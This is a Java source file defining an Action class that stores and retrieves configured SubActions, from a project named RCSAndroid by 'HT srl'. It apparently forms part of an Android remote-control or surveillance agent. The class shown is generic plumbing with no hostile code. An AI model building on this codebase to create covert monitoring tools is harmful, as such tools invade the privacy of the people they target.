/***********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : RCSAndroid
 * Created   : 01-dec-2010
 **********************************************/

package com.ht.RCSAndroidGUI.action;

import java.util.ArrayList;
import java.util.List;

import com.ht.RCSAndroidGUI.RCSException;
import com.ht.RCSAndroidGUI.util.Check;

// TODO: Auto-generated Javadoc
/**
 * The Class Action.
 */
public class Action {
	/** The Constant ACTION_NULL. */
	public static final int ACTION_NULL = -1;

	/** Action array. */
	// private final SubAction[] subArray;
	private final List<SubAction> list;

	/** Action ID. */
	private final int actionId;

	/** Number of subactions in this action. */
	// private final int subActionsNum;

	/** Internal action counter. */
	// private int subActionIndex;

	/**
	 * Action constructor.
	 * 
	 * @param id
	 *            : action id
	 * @param num
	 *            : number of subactions
	 * @throws RCSException
	 *             the RCS exception
	 */
	public Action(final int id, final int num) throws RCSException {
		if (id < 0 || num < 1) {
			throw new RCSException("Invalid id or invalid number of sub actions for this action: " + num);
		}

		this.actionId = id;
		list = new ArrayList<SubAction>();
	}

	/**
	 * Gets the id.
	 * 
	 * @return the id
	 */
	public int getId() {
		return this.actionId;
	}

	/**
	 * Gets the sub actions num.
	 * 
	 * @return the sub actions num
	 */
	public int getSubActionsNum() {
		return list.size();
	}

	/**
	 * Adds the sub action.
	 * 
	 * @param type
	 *            the type
	 * @param params
	 *            the params
	 * @throws RCSException
	 *             the RCS exception
	 */
	public void addSubAction(final int type, final byte[] params) throws RCSException {
		final SubAction sub = SubAction.factory(type, params);
		list.add(sub);
	}

	/**
	 * Gets the sub action.
	 * 
	 * @param index
	 *            the index
	 * @return the sub action
	 * @throws RCSException
	 *             the rCS exception
	 */
	public SubAction getSubAction(final int index) throws RCSException {
		if (index < 0 || index >= list.size()) {
			throw new RCSException("Subaction index above SubAction array boundary");
		}

		return list.get(index);
	}
}
